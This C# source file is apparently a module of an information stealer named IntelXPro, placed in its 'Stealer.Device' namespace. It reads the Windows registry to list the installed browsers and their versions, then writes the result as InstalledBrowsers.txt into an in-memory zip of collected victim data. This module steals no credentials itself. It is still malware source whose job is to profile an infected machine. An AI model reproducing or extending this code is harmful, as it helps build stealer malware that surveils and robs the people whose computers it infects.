using IntelXPro.src.IntelXPro.Dependencies.Data;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Device
{
    internal class InstalledBrowsers : ITarget
    {
        private class Browser
        {
            public string Name { get; set; }

            public string Path { get; set; }

            public string Version { get; set; }
        }

        public void Collect(InMemoryZip zip, Counter counter)
        {
            List<Browser> list = (from g in GetBrowsers().GroupBy((Browser b) => b.Name, StringComparer.OrdinalIgnoreCase)
                                  select g.First()).ToList();
            int maxName = Math.Max("Name".Length, list.Max((Browser b) => b.Name.Length));
            int maxVersion = Math.Max("Version".Length, list.Max((Browser b) => b.Version.Length));
            int length = "In Use".Length;
            List<string> list2 = new List<string>
        {
            "Name".PadRight(maxName) + " | " + "Version".PadRight(maxVersion),
            new string('-', maxName + maxVersion + length + 6)
        };
            list2.AddRange(list.Select(delegate (Browser b)
            {
                SafeGetExeName(b.Path);
                return b.Name.PadRight(maxName) + " | " + b.Version.PadRight(maxVersion);
            }));
            if (list.Count > 0)
            {
                zip.AddTextFile("InstalledBrowsers.txt", string.Join("\n", list2));
            }
        }

        private static IEnumerable<Browser> GetBrowsers()
        {
            string[] obj = new string[2] { "SOFTWARE\\WOW6432Node\\Clients\\StartMenuInternet", "SOFTWARE\\Clients\\StartMenuInternet" };
            List<Browser> list = new List<Browser>();
            string[] array = obj;
            foreach (string keyPath in array)
            {
                list.AddRange(GetBrowsersFromRegistry(keyPath, Registry.LocalMachine));
                list.AddRange(GetBrowsersFromRegistry(keyPath, Registry.CurrentUser));
            }
            Browser edgeLegacyVersion = GetEdgeLegacyVersion();
            if (edgeLegacyVersion != null)
            {
                list.Add(edgeLegacyVersion);
            }
            return list;
        }

        private static IEnumerable<Browser> GetBrowsersFromRegistry(string keyPath, RegistryKey root)
        {
            using (RegistryKey key = root.OpenSubKey(keyPath))
            {
                if (key == null)
                {
                    yield break;
                }
                string[] subKeyNames = key.GetSubKeyNames();
                string[] array = subKeyNames;
                foreach (string name in array)
                {
                    using (RegistryKey subkey = key.OpenSubKey(name))
                    {
                        if (!(subkey?.GetValue(null) is string name2))
                        {
                            continue;
                        }
                        string text = StripQuotesFromCommand(subkey.OpenSubKey("shell\\open\\command")?.GetValue(null)?.ToString());
                        string version = "unknown";
                        if (!string.IsNullOrEmpty(text) && File.Exists(text))
                        {
                            try
                            {
                                version = FileVersionInfo.GetVersionInfo(text).FileVersion;
                            }
                            catch
                            {
                            }
                        }
                        yield return new Browser
                        {
                            Name = name2,
                            Path = text,
                            Version = version
                        };
                    }
                }
            }
        }

        private static Browser GetEdgeLegacyVersion()
        {
            using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\CurrentVersion\\AppModel\\SystemAppData\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\Schemas"))
            {
                if (registryKey?.GetValue("PackageFullName") is string input)
                {
                    Match match = Regex.Match(input, "\\d+(\\.\\d+)+");
                    if (match.Success)
                    {
                        return new Browser
                        {
                            Name = "Microsoft Edge (Legacy)",
                            Path = null,
                            Version = match.Value
                        };
                    }
                }
            }
            return null;
        }

        private static string StripQuotesFromCommand(string command)
        {
            if (string.IsNullOrWhiteSpace(command))
            {
                return null;
            }
            command = command.Trim();
            if (command.StartsWith("\""))
            {
                int num = command.IndexOf('"', 1);
                if (num > 1)
                {
                    return command.Substring(1, num - 1);
                }
                return null;
            }
            int num2 = command.IndexOf(' ');
            if (num2 <= 0)
            {
                return command;
            }
            return command.Substring(0, num2);
        }

        private static string SafeGetExeName(string path)
        {
            try
            {
                if (string.IsNullOrWhiteSpace(path))
                {
                    return null;
                }
                return Path.GetFileName(path)?.ToUpperInvariant();
            }
            catch
            {
                return null;
            }
        }
    }
}
